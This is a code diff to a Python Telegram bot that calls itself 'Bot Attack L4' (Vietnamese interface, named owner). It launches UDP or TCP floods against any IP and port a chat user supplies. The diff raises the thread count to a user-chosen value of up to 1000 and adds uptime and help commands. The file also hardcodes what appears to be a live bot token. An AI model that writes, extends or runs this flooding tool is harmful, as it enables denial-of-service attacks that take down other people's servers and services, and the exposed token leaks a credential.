@@ -6,12 +6,14 @@ import telebot
 import json
 import os
 from flask import Flask, jsonify
+from datetime import datetime, timedelta
 
 total_sent = 0
 count_lock = threading.Lock()
 TOKEN = os.environ.get('TOKEN', '8186042947:AAH3yFUwAjhWSqHLBYzvJhNxb4LGap9Eap0')
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
+start_time = datetime.now()
 
 @app.route('/')
 def home():
@@ -50,7 +52,7 @@ def stats(dur, chat_id):
     global total_sent
     start = time.time()
     while time.time() - start < dur:
-        time.sleep(1)
+        time.sleep(10)
         with count_lock:
             status = {
                 "Status": "Ongoing",
@@ -93,19 +95,52 @@ def flood(ip, port, mode, concurrent, seconds, chat_id, username):
 def attack_command(message):
     try:
         args = message.text.split()[1:]
-        if len(args) != 4:
-            bot.reply_to(message, "Usage: /attack [ip] [port] [mode: udp/tcp] [seconds]")
+        if len(args) != 5:
+            bot.reply_to(message, "Usage: /attack [ip] [port] [mode: udp/tcp] [seconds] [threads]")
             return
-        ip, port, mode, seconds = args
+        ip, port, mode, seconds, threads = args
         port = int(port) if port else 80
         seconds = int(seconds)
+        threads = int(threads)
         if mode not in ["udp", "tcp"]:
             bot.reply_to(message, "Mode must be 'udp' or 'tcp'")
             return
+        if threads < 1 or threads > 1000:
+            bot.reply_to(message, "Threads must be between 1 and 1000")
+            return
         username = message.from_user.username or message.from_user.first_name
-        threading.Thread(target=flood, args=(ip, port, mode, 100, seconds, message.chat.id, username)).start()
+        threading.Thread(target=flood, args=(ip, port, mode, threads, seconds, message.chat.id, username)).start()
     except Exception as e:
         bot.reply_to(message, f"Error: {str(e)}")
+
+@bot.message_handler(commands=['uptime'])
+def uptime_command(message):
+    uptime = datetime.now() - start_time
+    days = uptime.days
+    hours, remainder = divmod(uptime.seconds, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    uptime_info = {
+        "Uptime": {
+            "Days": days,
+            "Hours": hours,
+            "Minutes": minutes,
+            "Seconds": seconds
+        }
+    }
+    bot.reply_to(message, f"```json\n{json.dumps(uptime_info, indent=2)}\n```", parse_mode="Markdown")
+
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    intro = {
+        "Message": "Chào mừng bạn đến với Bot Attack L4",
+        "Owner": "Vũ Xuân Kiên (@xkprj)",
+        "Commands": {
+            "/attack [ip] [port] [mode: udp/tcp] [seconds] [threads]": "Tấn công IP",
+            "/uptime": "Xem thời gian bot hoạt động",
+            "/start": "Giới thiệu bot và danh sách lệnh"
+        }
+    }
+    bot.reply_to(message, f"```json\n{json.dumps(intro, indent=2)}\n```", parse_mode="Markdown")
 
 def run_bot():
     bot.polling()
